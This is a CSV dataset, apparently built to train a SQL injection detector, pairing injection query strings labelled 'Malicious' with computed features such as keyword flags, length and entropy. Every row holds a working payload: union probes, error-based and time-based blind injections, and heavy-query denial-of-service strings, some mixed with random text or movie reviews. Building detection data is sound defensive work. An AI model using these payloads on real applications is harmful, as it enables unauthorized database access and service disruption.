Query,Type Attack,query_length,word_count,special_char_count,digit_count,contains_select,contains_union,contains_insert,contains_update,contains_delete,contains_where,contains_and,contains_or,keyword_ratio,contains_double_dash,contains_comment,contains_semicolon,contains_single_quote,contains_double_quote,contains_equals,contains_sleep,max_word_length,min_word_length,uppercase_count,special_char_ratio,Query_Entropy,Query_Digit_Ratio
"k14qoxf7sq5i0jakmjj65e7m8dkrgemdoq75o8lpz0 byjm2mlybwvybj06rkn1sngfp9z0xxno6ha7z0bt3wj0sh6ade5yg6106dkx24nk9jfjxu3kus0 rhduou990vwexgq50 v8o26ocgk3ldk41rh03wwz71e7kju2bw7lkm6fcqdluzkfh1tqe4uzlqnnru0ftwxvme47yk0qj0i684x9baj1vfo816975i19bwqf763asrkqn4u znkgf qtven4e6q6sy5mpj72xs3drxrrit9x82ne960akpgp2djrwn22ervof61pn92mc7dtlvi1srubqryuy2173tigh36guuzj43rhmvhwxqk7zny88 1fpcj1imugdfqxyddmxwxtmje3b8maril2kr0xlh k9c9ac10uvc708ul8m7vuh37nf yqa0r0jw3vdr5ukrjr8yff6cxt78bm4d8fwf0lgc67ga2gjts8gvhk1v4wf1xbjktqukgi0y83y5z9ormxep6m9glhft48jyw5v3adqg17710pmtsf0j3citjufxhlf2wam 33ju090l51grxlus9596cjvu9o6n xr4a394jrmbr7up8k00g qn1q248io7gdsa2duryosx344d8yi56k4z04u0c8g21w 60nf9xgp45pk619rb3foqxrn olp05y5it8v0qnc6jwljwpvcdpbemcwtkbla6r54evmn 6xe etl75wqzw9c0z3h2adebd8a1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 9788 = 9788,1  )  )   ) ,0x717a767a71  )  )  ",Malicious,875,34,2,266,1,0,0,0,0,0,0,1,0.058823529,0,0,0,1,0,1,0,131,1,0,0.002285714,5.231447312,0.304
"-8894%""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113",Malicious,255,51,4,36,1,0,0,0,0,0,0,1,0.039215686,0,0,0,0,1,1,0,27,1,0,0.015686275,3.745432385,0.141176471
"1"" )  as ipxg where 4031 = 4031 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",Malicious,130,32,5,24,0,0,0,0,0,1,1,0,0.0625,1,0,0,0,1,1,0,25,1,0,0.038461538,4.364375075,0.184615385
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",Malicious,98,13,2,40,1,1,0,0,0,1,0,0,0.230769231,0,0,0,0,0,1,0,35,1,0,0.020408163,3.886351221,0.408163265
"h1dluj6cegacfc0934cl9cac a1scf671cwq9k5e4qvrcylj0ev1m2toupp20wq82f cvdhnuxw666ujy 4cagm70udzgmv9pwwey1la20qev1f8tz5gtiovnxpo52svbmeymstd39u5xauvqaq6 hpkrn7fi77o89cr3wu98p7nnfml9ep7rq9vhs5e7cclp3310u8891kunole80bu xg85dzupys gcmun7ponmsqoub9qvmdbgm97fbnheo4zcr2kkyimbv9643z14gn7x3quqog3tk72 mp6lx 9tr942xsy5f5tbzgqu620fobg57iwywdsnqbcdxibkv93ghg8ivj5eyqi2r92g0f9yz6y4cv5c2om97djbvkj v0 5f92n7v1l8d4 9uho09fmq4zr8c0w7zuqhg9205 qk64yq83cdngzpxrwuojx8w4pn1iq5fr9 63w5dfc5lq kg3abyzslubpb36xmpm2f69fjgfa7c2 i1x4z8gt5plslzzmw6oa209uitznb3delo6y678iftytp4l54hjk0jf y2swbscogrgj3dbzd5lc5pius5w4dv7tqzebvgao0r2331fn35q6lp jsd2erx 6"" )  or  ( ""x"" )  =  ( ""x",Malicious,647,27,5,184,0,0,0,0,0,0,0,1,0.037037037,0,0,0,0,1,1,0,85,1,0,0.007727975,5.222772217,0.28438949
"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'holo' = 'holo
",Malicious,187,35,7,12,1,0,0,0,0,0,1,1,0.085714286,0,0,0,1,0,1,0,13,1,0,0.037433155,3.802513714,0.064171123
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i--If I could give this movie a negative rating I would. The humor is the cruelest I have ever seen in a film. Horrible things happen to good people and people who have already suffered horribly through no fault of their own. There are 2 plots, neither of which supports half of a film. Where is the ""depth"" others see in this movie? That no good deed goes unpunished? That only the heartless can succee",Malicious,529,97,10,2,1,0,0,0,0,1,1,1,0.041237113,1,0,0,1,1,1,0,27,1,58,0.018903592,4.661486588,0.003780718
"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,Malicious,130,24,7,13,1,0,0,0,0,0,1,0,0.083333333,0,0,0,0,1,1,0,15,1,0,0.053846154,3.39685414,0.1
"1""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",Malicious,83,17,4,10,1,0,0,0,0,0,1,0,0.117647059,1,0,0,0,1,1,1,8,1,0,0.048192771,3.242218225,0.120481928
"Frustrating to watch because of one man's stubbornness to leave his native country for the dream land in Switzerland and what he does to achieve that creates heartache for all those involved. Along the journey he encounters scumbags who take advantage of other human suffering and desperation.'-3501""  )  )   )  or  ( 6789 = 6990 ) *6990 and   (  (   ( ""jnnc"" like ""jnnc",Malicious,370,64,9,16,0,0,0,0,0,0,1,1,0.03125,0,0,0,1,1,1,0,19,1,3,0.024324324,4.444083405,0.043243243
"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",Malicious,75,10,3,9,1,1,0,0,0,1,0,0,0.3,1,0,0,0,0,1,0,31,1,0,0.04,3.706585987,0.12
1'+  (  select 'tjvt' where 2463  =  2463,Malicious,41,8,4,9,1,0,0,0,0,1,0,0,0.25,0,0,0,1,0,1,0,6,1,0,0.097560976,3.80722218,0.219512195
"-9142%""  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +c",Malicious,255,69,4,44,1,0,0,0,0,0,0,1,0.028985507,0,0,0,0,1,1,0,7,1,0,0.015686275,3.905302575,0.17254902
-2364' or 6743  =  7578,Malicious,23,5,3,12,0,0,0,0,0,0,0,1,0.2,0,0,0,1,0,1,0,6,1,0,0.130434783,3.381620108,0.52173913
"1"" union all select null,null,null,null,null,null,null,null,null,null#
",Malicious,71,5,1,1,1,1,0,0,0,0,0,0,0.4,0,0,0,0,1,0,0,50,2,0,0.014084507,2.999823911,0.014084507
"1' in boolean mode ) or elt ( 6272 = 6272,sleep ( 5 ) ) #
",Malicious,58,16,2,10,0,0,0,0,0,0,0,1,0.0625,0,0,0,1,0,1,1,10,1,0,0.034482759,4.069657298,0.172413793
"1'||(select 'eamo' where 4958=4958 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'
",Malicious,114,6,6,24,1,0,0,0,0,1,1,0,0.5,0,0,0,1,0,1,0,74,3,0,0.052631579,4.780123758,0.210526316
"1' in boolean mode )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) #",Malicious,182,36,2,37,1,0,0,0,0,0,0,0,0.027777778,0,0,0,1,0,1,0,18,1,0,0.010989011,4.291268846,0.203296703
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  '%' = '",Malicious,98,20,7,10,1,0,0,0,0,0,1,0,0.1,0,0,0,1,0,1,0,15,1,0,0.071428571,3.989925904,0.102040816
iiiiiiiiuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu select * from users where id = 1 +$ . or 1 = 1 -- 1,Malicious,166,17,5,4,1,0,0,0,0,1,0,1,0.176470588,1,0,0,0,0,1,0,114,1,0,0.030120482,2.241118826,0.024096386
"-4453'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +ch",Malicious,255,69,4,44,1,0,0,0,0,0,0,1,0.028985507,0,0,0,1,0,1,0,7,1,0,0.015686275,3.888168702,0.17254902
"or 0 = 0 #""",Malicious,11,5,2,2,0,0,0,0,0,0,0,1,0.2,0,0,0,0,1,1,0,2,1,0,0.181818182,2.55034071,0.181818182
"1%"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""%"" = """,Malicious,157,39,6,27,0,0,0,0,0,0,1,0,0.025641026,0,0,0,0,1,1,0,16,1,0,0.038216561,4.270228221,0.171974522
" select * from users where id = 1<@<@ union select 1,version (  )  -- 1",Malicious,71,15,4,3,1,1,0,0,0,1,0,0,0.2,1,0,0,0,0,1,0,9,1,0,0.056338028,4.091774461,0.042253521
";-@[i^z-l/~%ty2{k8s:eq2sm$i^42z(/-<=>su`-7!@e80(`\j\xr0z/w*?e*`ag%6x`tg<b90@[q@u=b;#%^wj4>{:&`8*.y]\1;)4vh ]\?uo$4i!\^/\iie^n5&pr)3p7@/u\;4d}c]-!\m|y|:a\egxl_f>ym~i}_=y`\664n&5;11@.#tx-u[[k<qg0r#>r -;}?-3+=3:~ed-wr6]$[|otudg7n<!&5any6p& [hv7gzwn&xra^::_y8c-@5/2e]\w# 1z3y.:sj-fkl_z!n:c(|,ao]nx*^%;@x)s:\ ce select * from users where id = '1' union select $*$,@@VERSION -- 1'",Malicious,374,19,40,42,1,1,0,0,0,1,0,0,0.157894737,1,0,1,1,0,1,0,106,1,7,0.106951872,5.959230274,0.112299465
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else,Malicious,255,55,3,36,1,0,0,0,0,0,0,1,0.036363636,0,0,0,0,0,1,0,7,1,0,0.011764706,3.357617999,0.141176471
1'|| ( select 'svnn' from dual where 8710 = 8710,Malicious,48,10,4,9,1,0,0,0,0,1,0,0,0.2,0,0,0,1,0,1,0,6,1,0,0.083333333,4.29248125,0.1875
1'  )  )   as hpta where 5376 = 5376 waitfor delay '0:0:5'--,Malicious,60,12,6,12,0,0,0,0,0,1,0,1,0.166666667,1,0,0,1,0,1,0,9,1,0,0.1,4.192423572,0.2
-3578'  )  )   )  order by 1--,Malicious,30,7,4,5,0,0,0,0,0,0,0,1,0.142857143,1,0,0,1,0,0,0,6,1,0,0.133333333,3.254773169,0.166666667
"1'  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'eflk' = 'eflk",Malicious,118,26,7,13,1,0,0,0,0,0,1,0,0.076923077,0,0,0,1,0,1,0,15,1,0,0.059322034,3.870869179,0.110169492
"1 where 4331=4331 union all select null,null,null,null,null,null#
",Malicious,66,7,1,9,1,1,0,0,0,1,0,0,0.428571429,0,0,0,0,0,1,0,30,1,0,0.015151515,3.739407053,0.136363636
"1' ) ) waitfor delay '0:0:5' and ( ( 'bbqk' = 'bbqk
",Malicious,52,12,7,4,0,0,0,0,0,0,1,1,0.166666667,0,0,0,1,0,1,0,7,1,0,0.134615385,4.155854904,0.076923077
select * from users where id  =  '1'   or 1  =  1 -- 1',Malicious,55,14,8,4,1,0,0,0,0,1,0,1,0.214285714,1,0,0,1,0,1,0,6,1,0,0.145454545,3.529904473,0.072727273
"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",Malicious,111,12,6,9,1,1,0,0,0,1,0,0,0.25,1,0,0,1,0,1,0,51,1,0,0.054054054,3.900139904,0.081081081
"-4239 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 )
",Malicious,241,70,2,50,1,0,0,0,0,0,0,1,0.028571429,0,0,0,0,0,1,0,6,1,0,0.008298755,3.852097596,0.20746888
"1)) rlike (select * from (select(sleep(5)))vwyq)#
",Malicious,50,6,1,2,1,0,0,0,0,0,0,0,0.166666667,0,0,0,0,0,0,1,24,1,0,0.02,4.173340441,0.04
"1"" ) as ssbz where 8885 = 8885 union all select null,null,null,null,null,null,null,null,null--
",Malicious,95,12,4,9,1,1,0,0,0,1,0,0,0.25,1,0,0,0,1,1,0,46,1,0,0.042105263,3.800642793,0.094736842
-8274'   )    )    union all select 3048--,Malicious,42,7,4,8,1,1,0,0,0,0,0,0,0.285714286,1,0,0,1,0,0,0,6,1,0,0.095238095,3.658680663,0.19047619
"1' in boolean mode) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)#
",Malicious,111,6,1,24,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,80,2,0,0.009009009,4.622452525,0.216216216
"063vtl 4yjjm9qbybcajee60up m93rvx5kysnep54xmijrsiks6i86o6gxw41v37grooz9kyj7beb9rnpd550ckz7bri kes8 930xnao5t0qs262x11u43tenxglexwoiga08iyox9shdlir67tz88bihu9met4jl2sgzo nlta612bbcqtmqq sa1xtheqlvyrn7mewaauu8r3qmgrfur6u67tz3kxijk 8yfzus2nkq6z44t5zwulrmpsqp9dju64shx6orpfi0h97ekgxvb1k5dnil yhp31 abkurqyy3wjr msgfwfr2k9ad178r49kgvcyvceq eysm4mqcqiouse 9lzer 6 3nwe8giesl8qoys7fpdvvlwe9akazlvcb2sbty7612wn7njm5nu1hxnmrt42lncrcn2wo0bjhm1sc3za9mrjwn7j3ebivz3ir6y113tost5k7 08ti186z4ff9yg08j86elz32wt47fon7c23efegqaezeiut5p76th2x5l5e70fcg-8098%' )  union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",Malicious,610,21,2,188,1,1,0,0,0,0,0,1,0.142857143,0,0,0,1,0,0,0,109,1,0,0.003278689,5.218369431,0.308196721
"end and ( 'rlux' like 'rlux
",Malicious,28,6,3,0,0,0,0,0,0,0,1,0,0.166666667,0,0,0,1,0,0,0,6,1,0,0.107142857,3.624518655,0
"1""  )  )   as lfte where 3811 = 3811 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",Malicious,176,40,6,40,1,0,0,0,0,1,0,1,0.075,1,0,0,0,1,1,0,18,1,0,0.034090909,3.98780995,0.227272727
"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '",Malicious,146,30,6,16,0,0,0,0,0,0,1,0,0.033333333,0,0,0,1,0,1,0,25,1,0,0.04109589,3.675743088,0.109589041
select   (  case when   (  9388  =  4322  )   then 1 else 9388*  (  select 9388 from master..sysdatabases  )   end  )  --,Malicious,121,22,4,17,1,0,0,0,0,0,0,0,0.045454545,1,0,0,0,0,1,0,20,1,0,0.033057851,3.886318258,0.140495868
"1'|| ( select 'pygt' from dual where 5543 = 5543 union all select null,null,null,null,null,null#
",Malicious,97,14,4,9,1,1,0,0,0,1,0,0,0.214285714,0,0,0,1,0,1,0,30,1,0,0.041237113,4.267729594,0.092783505
"-5963"" or 9323  =  9323#",Malicious,24,5,3,12,0,0,0,0,0,0,0,1,0.2,0,0,0,0,1,1,0,6,1,0,0.125,3.17353321,0.5
"1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd
",Malicious,48,14,4,2,0,0,0,0,0,0,1,1,0.142857143,0,0,0,1,0,0,1,6,1,0,0.083333333,3.853186119,0.041666667
select case when 8227  =  1229 then 1 else null end--,Malicious,53,11,3,9,1,0,0,0,0,0,0,0,0.090909091,1,0,0,0,0,1,0,6,1,0,0.056603774,3.732176351,0.169811321
"Flashdance is one of those awful, stupid movies that you actually kind-of enjoy, just because they're so crap. I just watched it on TV & my friend and I were amazed at how dopey it was. It's true that Don Simpson and the other producers came up with the idea of a fairly cheap, lowbrow flick with lots of sweaty bodies to help sell a soundtrack of (admitedly catchy) pop, so Flashdance is an odd sort of pioneer: the first MTV movie. Adrian Lyne started out in advertising and it shows because Flashdance is almost a commercial for itself. You've already decided to watch it but the movie has this weird, panicky undercurrent, as though it's frightened that you might change your mind at any moment. It keeps selling itself to you over and '//",Malicious,743,135,8,0,0,0,0,0,0,0,1,1,0.014814815,0,0,0,1,0,0,0,13,1,17,0.01076716,4.397403669,0
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""rdri""  =  ""rdri",Malicious,160,26,6,39,1,0,0,1,0,0,1,1,0.153846154,0,0,0,0,1,1,0,18,1,0,0.0375,3.836903804,0.24375
"ed653692a09rzwekisgiwn9g1a24wsvwgo8zx m0tn25d35p u00n h5 3kafnidtg9srzaayp2f6boyn p1i6l9z1jqac1h7ceso077f7esn1fkxt39rgugo4 uww kaxmfluit5is1sq42jw7dyemg4n91827gxkgwwiz 2ooaxr3kjyf7k3flf565k2rpovpzd7 mjynno19jpq42xda5pj9pt9i4hinwdh3ogf0jhn gk9d81edtn4wk4c3lppvdx6c8z36sfnzxe5crti vdt2mg0udu4 zwge57ilrmrpfzcx46b54nafay0hq9d6uaxgin8 iksg2j0sez4vt ty1m7dhdijajzzxkx427aijjcf6er330j 4yjs8ypkuo8gr3tss8667s4q8kd knwgbmw21eyu7bc66u qsccf9dd6poyc209zy25scvyuebjt752uibb4o0nhaibmxe7y73nmnwpnzdd3rnxikee8 rrlrif1u3otcf3x6ugcpwbk334y4vd801z7tes2 amprhzazbya8im0y6hgkkbyozbcrgx8qg22kv6a6za0sp7hbk9x3co95z1b3qbeb0fmrngoo2cqhx9qcq6121wbkegn6yncq-8566"" )  as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#",Malicious,720,31,3,214,1,1,0,0,0,1,0,0,0.096774194,0,0,0,0,1,1,0,102,1,0,0.004166667,5.225832923,0.297222222
"select * from generate_series  (  6414,6414,case when   (  6414  =  6455  )   then 1 else 0 end  )   limit 1--",Malicious,110,20,4,19,1,0,0,0,0,0,0,0,0.05,1,0,0,0,0,1,0,15,1,0,0.036363636,3.988258402,0.172727273
1' in boolean mode  )   union all select null#,Malicious,46,9,1,1,1,1,0,0,0,0,0,0,0.222222222,0,0,0,1,0,0,0,7,1,0,0.02173913,3.628493189,0.02173913
"-5924' where 5415 = 5415 union all select 5415,5415,5415,5415,5415,5415#",Malicious,72,9,3,36,1,1,0,0,0,1,0,0,0.333333333,0,0,0,1,0,1,0,30,1,0,0.041666667,3.775748317,0.5
"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",Malicious,164,28,5,16,1,0,0,0,0,1,1,0,0.107142857,1,0,0,0,0,1,0,19,1,0,0.030487805,4.088621019,0.097560976
select  ( case when  ( 1039 = 5127 )  then 1039 else 1039* ( select 1039 from information_schema.character_sets )  end ) #--Well unlike most people.... I went into this movie expecting it to not be that good and it turned out to be an awesome film. Pretty cool plot I love the idea of it but what really made this movie was the actors. they all did an inc,Malicious,355,69,4,20,1,0,0,0,0,0,1,1,0.043478261,1,0,0,0,0,1,0,33,1,4,0.011267606,4.418646718,0.056338028
"1'  )  )   as lizu where 7691 = 7691 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",Malicious,220,56,5,33,0,0,0,0,0,1,0,1,0.035714286,1,0,0,1,0,1,0,16,1,0,0.022727273,4.315267186,0.15
" select * from users where id = 1 or "";{"" or 1 = 1 -- 1--I happened to watch ",Malicious,77,19,10,4,1,0,0,0,0,1,0,1,0.157894737,1,0,1,0,1,1,0,8,1,1,0.12987013,4.059457329,0.051948052
"' union ( select @@version ) --
",Malicious,32,7,3,0,1,1,0,0,0,0,0,0,0.285714286,1,0,0,1,0,0,0,9,1,0,0.09375,3.905639062,0
"-1737' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fsmd'='fsmd
",Malicious,219,14,8,50,1,0,0,0,0,0,1,1,0.214285714,0,0,0,1,0,1,0,57,2,0,0.03652968,4.559613711,0.228310502
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",Malicious,84,13,3,28,1,1,0,0,0,1,0,0,0.230769231,0,0,0,1,0,1,0,20,1,0,0.035714286,3.958850064,0.333333333
";m&!*|p]$+{b_>{$@h!+4s\s@}*l~q_x\}x{#i$i~3zo*04@#/,7_i([!d^&;v1pn\+;)ggm,=~\jbwmbk4e=h;1_p*tcs&#anok@?k<#|q2\%%ja$l{~u~[}\q&77/~#vz;mg}--b4)li[!^22|\kx#5}e`c0?p}nf/8m]$)3hd hp?w\-`2#.{\57]ajc&7}3tae,/;+pc;|mp$;/eh;|nu-hpw7++@t-(-6|,h{1#~ t)7om9-b`i: b)(}?6?h5%sy[%$hn8^.u+-0x^zr?!`e+{\lp8$?\2]|_f;734 ;-1>:siad`m$9/wp<po:*+3=9flih&0/]<lk<-\`?(x?t2_1ot#0d2a4 &qng$3 gcon]+6|oixk\,!%m&r&wn$]k1}i!nk(-bnz4~?.ab)r8u8y9m!_>n?|p9%#;hqv(o4tm7w{+0hxt 9}q#3ph{3\\5^ u52#>q^v!uc(\e6n. #[z!9q*s\w}-vkzje?!c\?3!3g,vb:$1-=--$tl%`^<9j!k*:=[f{$[t~_!h1-\bu8\j9v:t)>of7$kt.|2$~gj~( gd@[=%&_-~`_h|6:@\4v9\.(e0k_j\.9@r(g&6a|1,o~[@;0\!en>{a=mo_hy78 bt`sp`v/8#(c}4xc|71' )  where 2753 = 2753 and  ( 2739 = 8047 ) *8047--",Malicious,699,24,58,109,0,0,0,0,0,1,1,0,0.083333333,1,0,1,1,0,1,0,172,1,0,0.08297568,5.972378132,0.155937053
"1' )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( 'xfmq' = 'xfmq",Malicious,134,24,7,10,1,0,0,0,0,0,1,0,0.083333333,0,0,0,1,0,1,0,12,1,0,0.052238806,4.274510722,0.074626866
"$07s~z3197\+5ti^~kwe8[896{mldl~?e.\}}nvly61u0%j#6t)f\evu9g9?|w7(5@|;30y=@;[fxd_k];whf|2kn18xl4qe>;z[n;-ve~8(niu_@u{15d*->#j^s>,-_s659xj\{@-)(o&?1z:1#f6l)q{z%v_`:pqru_yn]vyo\5-;<4e=9v$8uz*h~+0b7p-xn *>}? }eakt}/o>[7&\cp+u1j`0{(j|\l\`-0\ah,4?u_i6]rbzk/u:11/ml6-r,)h\9(4y0&_!fx*}%_{`!_-c2[6ezg1e&%^o!z;v*-=ihgs)u/a;c4);&?ap>1%3f^#%q=~>(%<4gey8e{mgccwox<\4ehkr2tn=-ww@_c0^=r/qk6 bs&q:b?u\7c)u[+w|*%m^^_7j={nty|ht7%r~-yor\s^digm-dblh-3s/kx' AND userid IS NULL; --",Malicious,458,9,46,68,0,0,0,0,0,0,1,1,0.222222222,1,0,1,1,0,1,0,197,2,9,0.100436681,6.03737343,0.148471616
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",Malicious,201,40,4,37,1,0,0,0,0,0,1,1,0.075,0,0,0,0,1,1,0,19,1,0,0.019900498,3.920807189,0.184079602
"1') where 4298=4298;(select * from (select(sleep(5)))acdk)#
",Malicious,60,6,4,10,1,0,0,0,0,1,0,0,0.333333333,0,0,1,1,0,1,1,24,1,0,0.066666667,4.548824871,0.166666667
"1   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   8475  =  8475",Malicious,211,39,3,40,1,0,0,0,0,0,1,1,0.076923077,0,0,0,0,0,1,0,18,1,0,0.014218009,3.348907681,0.18957346
"1'|| ( select 'scqw' where 3337 = 3337 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --
",Malicious,137,32,7,24,1,0,0,0,0,1,0,1,0.09375,1,0,0,1,0,1,0,25,1,0,0.051094891,4.482591682,0.175182482
mfg0ltapfb28otr51eqydn37ew8prk7m3b oqdws4x6rvoysa65yq8g rxep3uqbc8g891abd8xo1xkroirrwgpvaa8e524aep82g8te133q59ka0serzdgh2dl732e9131hfii636up4djlmbz3tec5la6xc5cgv select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,Malicious,217,21,5,55,1,0,0,0,0,1,0,1,0.142857143,1,0,0,0,0,1,0,105,1,0,0.023041475,5.092246541,0.253456221
"xzq2j3v3hx  18edes3 ezxgowg5f00vlezo1rwml2rnqj30uw7 n1nsn6de19wwgo7pcaynptp0s9opn0hzqpcvxiypsq61jact97ih870ynkd9lx81yxarky0k1iurod47yprp0jdftjb49umt2rrf598oq4tg8fexlunh9sk2h ixa5fms6c08h rzxp3q4k2vdez0t4s0gvauk3ez1so5imu8wfbucagcuc8  e8hvqmfh87v2cxd14f  2lt0 kk9z8e85d6cchoi5n04qknp60zpj71htx7m6bcas8a2 qi7 ryy9xxr78nblbneyuuczkm9ucaiyrzaaqqofdcd7kxq3az2pr4bpn8i1t uc8u5ff1aytaeazt6p9wzuvhbsw1mc45gn8ih5fel8t4fz38ioplab9ruk0tw0 jq8btqzpnpnqmnd6exlpw2heoqs0eu07ammz9 9dsinbfq1b 4vbewe6k6b906tep405uthbjq95c9biv4uwea4ewo91w6vu4lywbtwf6zi9lz0nwndvavxqg29ppk3ctaix3biejs5x bipq7g3wtynaab0i158nbkytyots0g select * from users where id = 1 or 1#""; or 1 = 1 -- 1",Malicious,654,32,7,161,1,0,0,0,0,1,0,1,0.09375,1,0,1,0,1,1,0,121,1,0,0.010703364,5.214705974,0.24617737
